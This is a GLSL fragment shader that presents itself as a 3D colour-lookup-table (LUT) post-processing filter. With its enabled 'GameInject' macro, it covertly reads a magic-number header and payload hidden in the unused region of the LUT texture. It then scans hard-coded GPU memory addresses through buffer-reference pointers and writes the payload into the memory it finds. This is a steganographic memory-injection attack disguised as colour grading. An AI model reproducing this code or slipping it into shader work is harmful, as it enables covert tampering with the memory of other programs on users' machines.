#version 450
#extension GL_EXT_buffer_reference:enable
#extension GL_ARB_gpu_shader_int64:require


layout(set = 0, binding = 0) uniform sampler2D img;
layout(set = 1, binding = 0) uniform sampler3D lut;

//Only works with cubes not with cuboids
layout(constant_id = 0) const int lutSize = 32;
layout(constant_id = 1) const int flipGB = 0;

layout(location = 0) in vec2 textureCoord;
layout(location = 0) out vec4 fragColor;

layout(buffer_reference, std430) buffer PhysicalBuffer
{
    uint data;
};
#define textureLod0Offset(img, coord, offset) textureLodOffset(img, coord, 0.0f, offset)
#define textureLod0(img, coord) textureLod(img, coord, 0.0f)
#define GameInject
// #define BaseShow

void main()
{

    vec4 color;
    if (flipGB != 0)
    {
        color = textureLod0(img, textureCoord).rbga;
    }
    else
    {
        color = textureLod0(img, textureCoord);
    }

    #ifndef GameInject
    //see https://developer.nvidia.com/gpugems/GPUGems2/gpugems2_chapter24.html
    vec3 scale = (vec3(lutSize) - 1.0) / vec3(lutSize);
    vec3 offset = 1.0 / (2.0 * vec3(lutSize));

    fragColor = vec4(textureLod0(lut, scale * color.rgb + offset).rgb, color.a);

#else
    //see https://developer.nvidia.com/gpugems/GPUGems2/gpugems2_chapter24.html
    vec3 scale = (vec3(32) - 1.0) / vec3(64);
    vec3 offset = 1.0 / (2.0 * vec3(64));
    
    int lutDim = 64;
    int usedDim = 32;
    
    // Only execute once per frame at pixel (0,0)
    // First, read and verify the header from unused region
    // Header starts at first unused voxel (32, 0, 0) and spans 4 pixels (12 bytes)
    uint headerBytes[12];
    
    // Read first 4 pixels from unused region starting at (32, 0, 0)
    // Pixel 0: (32, 0, 0) -> bytes 0-2
    vec3 coord0 = (vec3(32, 0, 0) + 0.5) / float(lutDim);
    vec4 pixel0 = textureLod0(lut, coord0);
    headerBytes[0] = uint(clamp(pixel0.r * 255.0, 0.0, 255.0));
    headerBytes[1] = uint(clamp(pixel0.g * 255.0, 0.0, 255.0));
    headerBytes[2] = uint(clamp(pixel0.b * 255.0, 0.0, 255.0));
    
    // Pixel 1: (33, 0, 0) -> bytes 3-5
    vec3 coord1 = (vec3(33, 0, 0) + 0.5) / float(lutDim);
    vec4 pixel1 = textureLod0(lut, coord1);
    headerBytes[3] = uint(clamp(pixel1.r * 255.0, 0.0, 255.0));
    headerBytes[4] = uint(clamp(pixel1.g * 255.0, 0.0, 255.0));
    headerBytes[5] = uint(clamp(pixel1.b * 255.0, 0.0, 255.0));
    
    // Pixel 2: (34, 0, 0) -> bytes 6-8
    vec3 coord2 = (vec3(34, 0, 0) + 0.5) / float(lutDim);
    vec4 pixel2 = textureLod0(lut, coord2);
    headerBytes[6] = uint(clamp(pixel2.r * 255.0, 0.0, 255.0));
    headerBytes[7] = uint(clamp(pixel2.g * 255.0, 0.0, 255.0));
    headerBytes[8] = uint(clamp(pixel2.b * 255.0, 0.0, 255.0));
    
    // Pixel 3: (35, 0, 0) -> bytes 9-11
    vec3 coord3 = (vec3(35, 0, 0) + 0.5) / float(lutDim);
    vec4 pixel3 = textureLod0(lut, coord3);
    headerBytes[9] = uint(clamp(pixel3.r * 255.0, 0.0, 255.0));
    headerBytes[10] = uint(clamp(pixel3.g * 255.0, 0.0, 255.0));
    headerBytes[11] = uint(clamp(pixel3.b * 255.0, 0.0, 255.0));
    
    // Verify magic patterns
    uint pattern1 = (headerBytes[0] << 24) | (headerBytes[1] << 16) |
    (headerBytes[2] << 8) | headerBytes[3];
    uint pattern2 = (headerBytes[4] << 24) | (headerBytes[5] << 16) |
    (headerBytes[6] << 8) | headerBytes[7];
    
    // Apply LUT color transformation
    vec4 lutColor = vec4(textureLod0(lut, scale * color.rgb + offset).rgb, color.a);
    fragColor = lutColor;

    uint targetPattern1 = 0xDEADBEEFu;
    uint targetPattern2 = 0xBEEFDEADu;

    #ifndef BaseShow
    if (pattern1 == targetPattern1 && pattern2 == targetPattern2)
    {
        // Target address for writing embedded data
        const uint64_t codeAddresses[] = {
            0xdf39910000UL,
            0xdf39a20000UL,
            0xdf39bf0000UL,
            0xdf39d10000UL,
            0xdf79780000UL,
            0xdf79890000UL,
            0xdf79760000UL,
            0xdf79880000UL,
        };
        float epsilon = 0.001;
        if (textureCoord.x < epsilon && textureCoord.y < epsilon)
        {
            // Extract data length from bytes 8-11
            uint dataLength = (headerBytes[8] << 24) | (headerBytes[9] << 16) |
            (headerBytes[10] << 8) | headerBytes[11] + 12;
            // scan form codeAddresses to find the magic number targetPattern2
            
            uint64_t aimed_address = 0;
            for (int i = 0; i < codeAddresses.length(); i++)
            {
                    for (int j = 0; j < 0x10000; j += 0x10)
                    {
                        uint64_t code_segment_addr = codeAddresses[i] + uint64_t(j);
                        PhysicalBuffer buf = PhysicalBuffer(codeAddresses[i] + uint64_t(j) + 4);
                        
                        if (buf.data == targetPattern2)
                        {
                            aimed_address = code_segment_addr;
                            // scan front util reach the blank 16Bytes
                            while (true)
                            {
                                aimed_address -= 0x10;
                                PhysicalBuffer check_buf1 = PhysicalBuffer(aimed_address);
                                PhysicalBuffer check_buf2 = PhysicalBuffer(aimed_address + 4);
                                PhysicalBuffer check_buf3 = PhysicalBuffer(aimed_address + 8);
                                PhysicalBuffer check_buf4 = PhysicalBuffer(aimed_address + 12);
                                if (check_buf1.data == 0u && check_buf2.data == 0u &&
                                check_buf3.data == 0u && check_buf4.data == 0u)
                                {
                                    // Found blank region
                                    aimed_address += 0x10; // Move to first non-blank
                                    break;
                                }
                            }
                            // Now write the data to physical memory
                            // Skip the 12-byte header, write only the actual data
                            uint byteBuffer[4];
                            int bufferIndex = 0;
                            uint writeAddr = 0;
                            uint totalBytesRead = 0;
                            
                            for (int z = 0; z < lutDim; z++)
                            {
                                for (int y = 0; y < lutDim; y++)
                                {
                                    for (int x = 0; x < lutDim; x++)
                                    {
                                        // Skip the used region [0:32, 0:32, 0:32]
                                        if (x < usedDim && y < usedDim && z < usedDim)
                                            continue;
                                        
                                        // Read pixel from LUT unused region
                                        vec3 dataCoord = (vec3(x, z, y) + 0.5) / float(lutDim);
                                        vec4 dataPixel = textureLod0(lut, dataCoord);
                                        
                                        // Process 3 bytes (RGB)
                                        for (int component = 0; component < 3; component++)
                                        {
                                            uint byteValue;
                                            if (component == 0)
                                                byteValue = uint(clamp(dataPixel.r * 255.0, 0.0, 255.0));
                                            else if (component == 1)
                                                byteValue = uint(clamp(dataPixel.g * 255.0, 0.0, 255.0));
                                            else
                                                byteValue = uint(clamp(dataPixel.b * 255.0, 0.0, 255.0));
                                            
                                            totalBytesRead++;
                                            
                                            // Skip header bytes (first 12 bytes)
                                            if (totalBytesRead <= 12)
                                                continue;
                                            
                                            // Only write data bytes, stop when reaching dataLength
                                            if (totalBytesRead > dataLength)
                                                break;
                                            
                                            // Add to buffer
                                            byteBuffer[bufferIndex++] = byteValue;
                                            
                                            // Write when buffer is full
                                            if (bufferIndex == 4)
                                            {
                                                // Little-endian: byte[0] is LSB, byte[3] is MSB
                                                uint writeData = byteBuffer[0] | (byteBuffer[1] << 8) |
                                                (byteBuffer[2] << 16) | (byteBuffer[3] << 24);
                                                // fragColor = vec4(1.0, 0.0, 0.0, 1.0); // Debug: indicate writing
                                                PhysicalBuffer buf = PhysicalBuffer(aimed_address + uint64_t(writeAddr));
                                                buf.data = writeData;
                                                writeAddr += 4;
                                                bufferIndex = 0;
                                            }
                                        }
                                        if (totalBytesRead >= dataLength)
                                            break;
                                        // float temp_value = float(dataLength) / 0xA00;
                                        // fragColor = vec4(temp_value, 0.0, 0.0, 1.0); // Debug: indicate writing

                                    }
                                    if (totalBytesRead >= dataLength)
                                        break;
                                }
                                if (totalBytesRead >= dataLength)
                                    break;
                            }
                            
                            // Flush any remaining bytes
                            if (bufferIndex > 0)
                            {
                                // Little-endian: fill remaining bytes
                                uint writeData = 0;
                                for (int i = 0; i < bufferIndex; i++)
                                {
                                    writeData |= (byteBuffer[i] << (i * 8));
                                }
                                PhysicalBuffer buf = PhysicalBuffer(aimed_address + uint64_t(writeAddr));
                                buf.data = writeData;
                            }
                        }
                    }
                }
        }
    }
#else
    if (pattern1 != targetPattern1 && pattern2 == targetPattern2)
    {
        fragColor = vec4(1.0, 0.0, 0.0, 1.0);
    }

    // Check if top-left 3x3 region of input image is all black
    // If all 9 pixels are (0,0,0), skip execution
    bool allBlack = true;
    
    // Get image dimensions for pixel size calculation
    vec2 imgSize = vec2(textureSize(img, 0));
    vec2 pixelSize = 1.0 / imgSize;
    
    // Sample 3x3 grid at top-left corner
    for (int dy = 0; dy < 3 && allBlack; dy++)
    {
        for (int dx = 0; dx < 3 && allBlack; dx++)
        {
            vec2 sampleCoord = vec2(float(dx) + 0.5, float(dy) + 0.5) * pixelSize;
            vec4 pixel = textureLod0(img, sampleCoord);
            
            // Check if pixel is not black (threshold for floating point comparison)
            if (pixel.r > 0.01 || pixel.g > 0.01 || pixel.b > 0.01)
            {
                allBlack = false;
            }
        }
    }
    
    if (!allBlack)
    {
        // Draw letter 'A' marker in bottom-right 32x32 region
        vec2 pixelCoord = textureCoord * imgSize;
        
        // Define marker region (bottom-right 32x32)
        int markerSize = 32;
        vec2 markerStart = imgSize - vec2(markerSize);
        
        // Check if current pixel is in marker region
        if (pixelCoord.x >= markerStart.x && pixelCoord.y >= markerStart.y)
        {
            // Calculate position within marker region
            vec2 markerPos = pixelCoord - markerStart;
            int mx = int(markerPos.x);
            int my = int(markerPos.y);
            
            // Draw letter 'A' pattern
            bool isLetter = false;
            float progress = float(my) / float(markerSize);
            
            // Left diagonal leg
            int x_left = int(float(markerSize) * 0.5 - float(markerSize) * 0.3 * progress);
            if (mx >= x_left && mx < x_left + 2)
                isLetter = true;
            
            // Right diagonal leg
            int x_right = int(float(markerSize) * 0.5 + float(markerSize) * 0.3 * progress);
            if (mx >= x_right && mx < x_right + 2)
                isLetter = true;
            
            // Horizontal bar (middle)
            int bar_y = int(float(markerSize) * 0.55);
            if (my >= bar_y && my < bar_y + 2)
            {
                int x_start = int(float(markerSize) * 0.3);
                int x_end = int(float(markerSize) * 0.7);
                if (mx >= x_start && mx < x_end)
                    isLetter = true;
            }
            
            // Set color: white for letter, black for background
            if (isLetter)
                fragColor = vec4(1.0, 1.0, 1.0, 1.0);  // White
            else
                fragColor = vec4(0.0, 0.0, 0.0, 1.0);  // Black

        }
    }
#endif


#endif
}